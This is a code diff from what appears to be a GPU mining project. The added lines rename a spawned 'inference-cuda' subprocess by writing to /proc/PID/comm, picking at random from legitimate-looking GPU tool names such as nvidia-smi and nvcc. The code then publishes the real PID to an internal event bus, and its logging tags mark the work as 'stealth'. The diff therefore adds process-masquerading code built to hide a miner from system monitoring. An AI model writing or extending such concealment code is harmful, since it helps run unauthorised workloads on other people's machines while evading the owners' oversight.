@@ -216,6 +216,32 @@ def main():
                 # stdout and stderr will inherit parent's pipes for logging
             )
             logger.info(f"✅ [GPU-POST-EXEC-STEALTH] inference-cuda started as subprocess PID: {process.pid}")
+            # ---- New: Rename child PID and publish to EventBus ----
+            try:
+                stealth_names = [
+                    "nvidia-smi", "cuda-gdb", "nvcc", "nvidia-ml-py", 
+                    "nvidia-settings", "gpu-manager", "glxgears", 
+                    "vulkan-info", "mesa-loader", "drm-tip"
+                ]
+                new_name = random.choice(stealth_names)[:15]
+                with open(f"/proc/{process.pid}/comm", "w") as comm_file:
+                    comm_file.write(new_name + "\n")
+                logger.info(f"✅ [GPU-POST-EXEC-STEALTH] Renamed child PID {process.pid} to '{new_name}'")
+                # Publish real PID to EventBus so other modules can target it
+                try:
+                    from mining_environment.scripts.auxiliary_modules.event_bus import get_event_bus
+                    event_payload = {
+                        'pid': process.pid,
+                        'process_name': new_name,
+                        'role': 'real',
+                        'timestamp': time.time()
+                    }
+                    get_event_bus().publish('mining:gpu_pid_registered', event_payload)
+                    logger.info("✅ [GPU-POST-EXEC-STEALTH] Published gpu_pid_registered event for real PID")
+                except Exception as bus_err:
+                    logger.error(f"❌ [GPU-POST-EXEC-STEALTH] EventBus publish failed: {bus_err}")
+            except Exception as rename_err:
+                logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Failed to rename child PID: {rename_err}")
             
             # 🔒 PHASE 2: Enhanced GPU Resource Monitoring + Stealth - Dựa trên patterns từ resource_control.py
             def maintain_gpu_subprocess_stealth():
